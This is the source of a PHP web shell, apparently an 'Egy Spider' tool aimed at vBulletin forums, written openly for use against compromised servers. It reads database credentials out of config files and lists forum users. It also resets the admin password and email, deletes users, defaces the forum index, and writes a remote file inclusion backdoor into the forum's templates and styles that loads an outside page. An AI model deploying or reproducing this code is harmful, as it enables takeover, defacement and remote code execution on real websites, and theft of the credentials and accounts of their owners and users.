
<html><head><title>EgY SpIdEr </title>
<STYLE>

BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #666666; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}

tr {
BORDER-RIGHT:  #dadada ;
BORDER-TOP:    #dadada ;
BORDER-LEFT:   #dadada ;
BORDER-BOTTOM: #dadada ;
color: #ffffff;
}
td {
BORDER-RIGHT:  #dadada ;
BORDER-TOP:    #dadada ;
BORDER-LEFT:   #dadada ;
BORDER-BOTTOM: #dadada ;
color: #dadada;
}
.table1 {
BORDER: 1;
BACKGROUND-COLOR: #000000;
color: #333333;
}
.td1 {
BORDER: 1;
font: 7pt tahoma;
color: #ffffff;
}
.tr1 {
BORDER: 1;
color: #dadada;
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #dadada;
}
input {
BORDER-RIGHT:  #00FF00 1 solid;
BORDER-TOP:    #00FF00 1 solid;
BORDER-LEFT:  #00FF00 1 solid;
BORDER-BOTTOM: #00FF00 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #dadada;;
}
submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #dadada;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #dadada;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>
</head>
 <body bgcolor="#000000" text="lime" link="lime" vlink="lime">
 <center>
<?
$act = $_GET['act'];
if($act=='reconfig' && isset($_POST['path']))
{
$path = $_POST['path'];
include $path;
?>
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime"><th>::::Read Config Data::::</th><th><? echo '<font color=yellow>' . $path . '</font>'; ?></th>
<tr>
<th>Host : </th><th><? echo '<font color=yellow>' . $config['MasterServer']['servername'] . '</font>'; ?></th>
</tr>
<tr>
<th>User : </th><th><? echo '<font color=yellow>' . $config['MasterServer']['username'] . '</font>'; ?></th>
</tr>
<tr>
<th>Pass : </th><th><?
$passsql = $config['MasterServer']['password'];
if ($passsql == '')
{
$result = '<font color=red>No Password</font>';
} else {
$result = '<font color=yellow>' . $passsql . '</font>';
}
echo $result; ?></th>
</tr>
<tr>
<th>Name : </th><th><? echo '<font color=yellow>' . $config['Database']['dbname'] . '</font>'; ?></th>
</tr>
</table>
<?
}
if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="del"  && isset($_POST['vbuser']) )
{
 $host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
$vbuser = $_POST['vbuser'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font color=yellow>' . $db . '</font></font>';
?>
<hr color="#00FF00" />
<?
$query = 'delete * from user where username="' . $vbuser . '";';
$r = mysql_query($query);
if ($r)
{
echo '<font color=yellow>User : ' . $vbuser . ' was deleted</font>';
} else {
echo '<font color=red>User : ' . $vbuser . ' could not be deleted</font>';
}
}
if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="shell"  && isset($_POST['var']))
{
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
$var = $_POST['var'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font color=yellow>' . $db . '</font></font>';
?>
<hr color="#00FF00" />
<?
$Wdt = 'UPDATE `template` SET `template` = \' ".print include($HTTP_GET_VARS[' . $var . '])." \'WHERE `title` =\'FORUMHOME\';';
$Wdt2= 'UPDATE `style` SET `css` = \' ".print include($HTTP_GET_VARS[' . $var . '])." \', `stylevars` = \'\', `csscolors` = \'\', `editorstyles` = \'\' ;';
$result=mysql_query($Wdt);
  if ($result) {echo "<p>Done Exploit.</p><br>Use this : <br> index.php?" . $var . "=shell.txt";}else{
echo "<p>Error</p>";}
$result1=mysql_query($Wdt2);
  if ($result1) { echo "<p>Done Create File</p><br>Use this : <br> index.php?" . $var . "=shell.txt";} else{ echo "<p>Error</p>";}
}
if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="code"  && isset($_POST['code']))
{
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
$index = $_POST['code'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font color=yellow>' . $db . '</font></font>';
?>
<hr color="#00FF00" />
<?
$index = $_POST['b'];
$Wdt = 'UPDATE `template` SET `template` = \' ' . $index . '  \'WHERE `title` =\'FORUMHOME\';';
$Wdt2= 'UPDATE `style` SET `css` = \' ' . $index . ' \', `stylevars` = \'\', `csscolors` = \'\', `editorstyles` = \'\' ;';
$result=mysql_query($Wdt);
  if ($result) {echo "<p>Index was Changed Succefully</p>";}else{
echo "<p>Failed to change index</p>";}
$result1=mysql_query($Wdt2);
if ($result1) {echo "<p>Done Create File</p>";} else{ echo "<p>Error</p>";}
}

if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="inc"  && isset($_POST['link']))
{
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
$vblink = $_POST['link'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font color=yellow>' . $db . '</font></font>';
?>
<hr color="#00FF00" />
<?
$hack15 = 'UPDATE `template` SET `template` = \'$spacer_open
{${include(\'\'' . $vblink . '\'\')}}{${exit()}}&
$_phpinclude_output\'WHERE `title` =\'FORUMHOME\';';
$hack= 'UPDATE `style` SET `css` = \'$spacer_open
{${include(\'\'' . $vblink .'\'\')}}{${exit()}}&
$_phpinclude_output\', `stylevars` = \'\', `csscolors` = \'\', `editorstyles` = \'\' ;';
$result=mysql_query($hack15) or die(mysql_error());
$result=mysql_query($hack) or die(mysql_error());
}
if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="mail"  && isset($_POST['vbuser'])  && isset($_POST['vbmail']))
{
 $host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
$vbuser = $_POST['vbuser'];
$vbmail = $_POST['vbmail'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font color=yellow>' . $db . '</font></font>';
?>
<hr color="#00FF00" />
<?
$query = 'update user set email="' . $vbmail . '" where username="' . $vbuser . '";';
$re = mysql_query($query);
if ($re)
{
echo '<font size=3><font color=yellow>The E-MAIL of the user </font><font color=red>' . $vbuser . '</font><font color=yellow> was changed to </font><font color=red>' . $vbmail . '</font><br>Back to <a href="?">Shell</a></font>';
} else {
echo '<font size=3><font color=red>Failed to change E-MAIL</font></font>';
}
}
if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="psw"  && isset($_POST['vbuser'])  && isset($_POST['vbpass']))
{
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
$vbuser = $_POST['vbuser'];
$vbpass = $_POST['vbpass'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font color=yellow>' . $db . '</font></font>';
?>
<hr color="#00FF00" />
<?
$query = 'select * from user where username="' . $vbuser . '";';
$result = mysql_query($query);
while ($row = mysql_fetch_array($result))
{
$salt = $row['salt'];
$x = md5($vbpass);
$x =$x . $salt;
$pass_salt = md5($x);
$query = 'update user set password="' . $pass_salt . '" where username="' . $vbuser . '";';
$re = mysql_query($query);
if ($re)
{
echo '<font size=3><font color=yellow>The pass of the user </font><font color=red>' . $vbuser . '</font><font color=yellow> was changed to </font><font color=red>' . $vbpass . '</font><br>Back to <a href="?">Shell</a></font>';
} else {
echo '<font size=3><font color=red>Failed to change PassWord</font></font>';
}
}
}
if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="login")
{
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font color=yellow>' . $db . '</font></font>';
?>
<hr color="#00FF00" />
<form name="changepass" action="?act=psw" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th>:::::Change User Password:::::</th><th><input type="submit" name="Change" value="Change" /></th>
<tr><td>User : </td><td><input name="vbuser" value="admin" /></td></tr>
<tr><td>Pass : </td><td><input name="vbpass" value="egy spider" /></td></tr>
</table>
<?
echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
?>
</form>
<hr color="#00FF00" />
<form name="changepass" action="?act=mail" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th>:::::Change User E-MAIL:::::</th><th><input type="submit" name="Change" value="Change" /></th>
<tr><td>User : </td><td><input name="vbuser" value="admin" /></td></tr>
<tr><td>MAIL : </td><td><input name="vbmail" value="egy_spider@hotmail.com" /></td></tr>
</table>
<?
echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
?>
</form>
<hr color="#00FF00" />
<form name="changepass" action="?act=del" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th>:::::Delete a user:::::</th><th><input type="submit" name="Change" value="Change" /></th>
<tr><td>User : </td><td><input name="vbuser" value="admin" /></td></tr>
</table>
<?
echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
?>
</form>
<hr color="#00FF00" />
<form name="changepass" action="?act=inc" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th>:::::Change Index by Inclusion(Not PL(Al-Massya)):::::</th><th><input type="submit" name="Change" value="Change" /></th>
<tr><td>Index Link : </td><td><input name="link" value="http://www.egyspider.com/hacked.html" /></td></tr>
</table>
<?
echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
?>
</form>
<hr color="#00FF00" />
<form name="changepass" action="?act=code" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th>:::::Change Index by Code(All Edition):::::</th><th><input type="submit" name="Change" value="Change" /></th>
<tr><td>Index Code : </td><td><textarea name="code" cols=60 rows=20></textarea></td></tr>
</table>
<?
echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
?>
</form>
<hr color="#00FF00" />
<form name="changepass" action="?act=shell" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th>:::::Inject FileInclusion Exploit(NOT PL(AL-MASSYA)):::::</th><th><input type="submit" name="Change" value="Change" /></th>
<tr><td>Variable : </td><td><input name="var" value="shell" /></td></tr>
</table>
<?
echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
?>
</form>
<?
}
if ($act == ''){
?>
<form name="myform" action="?act=login" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th>:::::DATABASE CONFIG:::::</th><th><input type="submit" name="Connect" value="Connect" /></th><tr><td>Host : </td><td><input name="host" value="localhost" /></td></tr>
<tr><td>User : </td><td><input name="user" value="root" /></td></tr>
<tr><td>Pass : </td><td><input name="pass" value="" /></td></tr>
<tr><td>Name : </td><td><input name="db" value="vb" /></td></tr>
</table>
</form>

<?
}
if ($act == 'lst' && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['host']) && isset($_POST['db']))
{
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font color=yellow>' . $db . '</font></font>';
?>
<hr color="#00FF00" />
<?
$re = mysql_query('select * from user');
echo'<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime"><th>ID</th><th>USERNAME</th><th>EMAIL</th>';
while ($row = mysql_fetch_array($re))
{
echo'<tr><td>' . $row['userid'] . '</td><td>' . $row['username'] . '</td><td>' . $row['email'] . '</td></tr>';
}
echo'</table>';
?>
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime"><th><?
$count = mysql_num_rows($re);
echo 'Number of users registered is : [ ' . $count . ' ]';
 ?></th></table>
<?
}
if ($act == 'users'){
?>
 <form name="myform" action="?act=lst" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th>:::::DATABASE CONFIG:::::</th><th><input type="submit" name="Connect" value="Connect" /></th><tr><td>Host : </td><td><input name="host" value="localhost" /></td></tr>
<tr><td>User : </td><td><input name="user" value="root" /></td></tr>
<tr><td>Pass : </td><td><input name="pass" value="" /></td></tr>
<tr><td>Name : </td><td><input name="db" value="vb" /></td></tr>
</table>
</form>
<?
}
if ($act=='config')
{
?>
<form name="myform" action="?act=reconfig" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th>:::::CONFIG PATH:::::</th><th><input type="submit" name="Connect" value="Read" /></th>
<tr><td>PATH : </td><td><input name="path" value="/home/hacked/public_html/vb/includes/config.php" /></td></tr></table></form>
<?
}
if ($act=='index')
{
// Index Editor<HTML Editor>
?>
<script language='javascript'>
function link(){
var X = prompt("EnterText","")
if (X=="" | X==null ) {
return;
}
var y = prompt("Enterlink","")
if (y=="" | y==null ) {
return;
}

indexform.index.value=indexform.index.value + "<a href=" + y +">"+X+"</a>";

}

function right(){
var X = prompt("Enter Text","")
if (X=="" | X==null ) {
return;
}
indexform.index.value=indexform.index.value + "<p align='right'>"+X+"</p>";

}
function left(){
var X = prompt("Enter Text","")
if (X=="" | X==null ) {
return;
}
indexform.index.value=indexform.index.value + "<p align='left'>"+X+"</p>";

}
function center(){
var X = prompt("Enter Text","")
if (X=="" | X==null ) {
return;
}
indexform.index.value=indexform.index.value + "<center>"+X+"</center>";

}
function colour(){
var X = prompt("EnterText","")
if (X=="" | X==null ) {
return;
}
var y = prompt("EnterColour","")
if (y=="" | y==null ) {
return;
}

indexform.index.value=indexform.index.value + "<font color=" + y +">"+X+"</font>";

}
function b(){
var X = prompt("Enter Text","")
if (X=="" | X==null ) {
return;
}
indexform.index.value=indexform.index.value + "<B>"+X+"</B>";

}
function u(){
var X = prompt("Enter Text","")
if (X=="" | X==null ) {
return;
}
indexform.index.value=indexform.index.value + "<U>"+X+"</U>";

}
function i(){
var X = prompt("Enter Text","")
if (X=="" | X==null ) {
return;
}
indexform.index.value=indexform.index.value + "<I>"+X+"</I>";

}
function mar(){
var X = prompt("Enter Text","")
if (X=="" | X==null ) {
return;
}
indexform.index.value=indexform.index.value + "<marquee>"+X+"</marquee>";

}
function img(){
var X = prompt("Enter link","")
if (X=="" | X==null ) {
return;
}
indexform.index.value=indexform.index.value + "<img src='"+X+"'></img>";

}
function br(){
indexform.index.value=indexform.index.value + "<br>";

}
</script>
<table border="1" bordercolor="#008000" bordercolordark="#008000"
bordercolorlight="#008000"><th><a onclick='return center()'>Center</a> ||| <a onclick='return left()'>Left</a> ||| <a onclick='return right()'>right</a> ||| <a onclick='return b()'>Bold</a> ||| <a onclick='return u()'>UnderLine</a> ||| <a onclick='return i()'>Italic</a> ||| <a onclick='return br()'>NewLine</a> ||| <a onclick='return colour()'>Colour</a> ||| <a onclick='return mar()'>Marquee ||| <a onclick='return img()'>Picture</a> ||| <a onclick='return link()'>Link</a></a></th><tr><TD>
<center><form name="indexform" action="" method="post"><textarea name='index' rows='14' cols='86'></textarea></p>
</form></form></center>
</TD></tr><tr><td>Copy The Code after Finishing your index</td></tr></table>
<?
}
?>
<hr color="#00FF00" />
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime"><tr><td><a href="?">Main Shell</a></td><td><a href="?act=users">List Users</a></td><td><a href="?act=index">Index Maker</a></td><td><a href="?act=config">ReadConfig</a></td></tr></table>
<p align="center">www.egyspider.com</p>
<DIV id="n" align="center">
  <TABLE borderColor="#111111" cellSpacing="0" cellPadding="0" width="100%" border="1">
    <TBODY>
      <TR>
        <TD width="100%"><p align="center"><STRONG>o---[ r57.biz | | <A egy_spider@hotmail.com>egy_spider@hotmail.com</A> |developer by egy spider   (ahmed rageh) ]---o</STRONG></p></TD>
      </TR>
    </TBODY>
  </TABLE>
</DIV>
</center> 
 </body>
</html>
